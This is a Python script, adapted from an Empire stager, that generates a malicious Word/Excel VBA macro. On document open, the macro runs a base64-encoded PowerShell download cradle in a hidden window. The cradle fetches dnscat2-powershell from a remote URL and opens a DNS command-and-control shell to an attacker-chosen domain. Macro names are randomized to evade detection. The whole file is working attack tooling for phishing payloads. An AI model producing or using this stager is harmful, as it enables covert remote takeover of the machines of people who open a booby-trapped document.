"""
dnscat2-poweshell macro launcher

Using macro stager from Empire - https://github.com/EmpireProject/Empire/blob/master/lib/stagers/windows/macro.py

"""

import base64
import argparse
import random
import string


def chunks(l, n):
    """
    Generator to split a string l into chunks of size n.

    Used by macro modules.
    """
    for i in range(0, len(l), n):
        yield l[i:i + n]



def main():

    parser = argparse.ArgumentParser(description='Generates a dnscat2-powershell macro stager')
    parser.add_argument("domain", help='The domain to query')
    parser.add_argument("DNSServer", nargs='?', help='IP to directly query server. Optional')
    parser.add_argument("cradle", nargs='?', help='Choose download cradle. Optional')
    args = parser.parse_args()

    # randomize macro elements
    Str = ''.join(random.choice(string.letters) for i in range(random.randint(1, len(args.domain))))
    Method = ''.join(random.choice(string.letters) for i in range(random.randint(1, len(args.domain))))


    cradle = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1'); "
    if args.cradle:
        cradle = args.cradle

    cradle += "Start-Dnscat2 -Domain " + args.domain
    if args.DNSServer:
        cradle += " -DNSServer " + args.DNSServer

    cradle += " -ExecPS;"

    # fucking aye - https://byt3bl33d3r.github.io/converting-commands-to-powershell-compatible-encoded-strings-for-dummies.html
    enc = base64.b64encode(cradle.encode('UTF-16LE'))

    powershell  = "powershell.exe -v 2 -noP -sta -w 1 -enc "

    for_chunks = powershell + enc

    payload_chunks = list(chunks(for_chunks, 50))
    payload = "\tDim " + Str + " As String\n"
    payload += "\t" + Str + " = \"" + str(payload_chunks[0]).replace("\"", "\"\"") + "\"\n"
    for chunk in payload_chunks[1:]:
        payload += "\t" + Str + " = " + Str + " + \"" + str(chunk).replace("\"", "\"\"") + "\"\n"

    macro = "Sub Auto_Open()\n"
    macro += "\t" + Method + "\n"
    macro += "End Sub\n\n"
    macro = "Sub AutoOpen()\n"
    macro += "\t" + Method + "\n"
    macro += "End Sub\n\n"

    macro += "Sub Document_Open()\n"
    macro += "\t" + Method + "\n"
    macro += "End Sub\n\n"

    macro += "Public Function " + Method + "() As Variant\n"
    macro += payload
    macro += "\tConst HIDDEN_WINDOW = 0\n"
    macro += "\tstrComputer = \".\"\n"
    macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n"
    macro += "\tSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\n"
    macro += "\tSet objConfig = objStartup.SpawnInstance_\n"
    macro += "\tobjConfig.ShowWindow = HIDDEN_WINDOW\n"
    macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n"
    macro += "\tobjProcess.Create " + Str + ", Null, objConfig, intProcessID\n"
    macro += "End Function\n"

    print(macro)

if __name__ == "__main__":
    main()






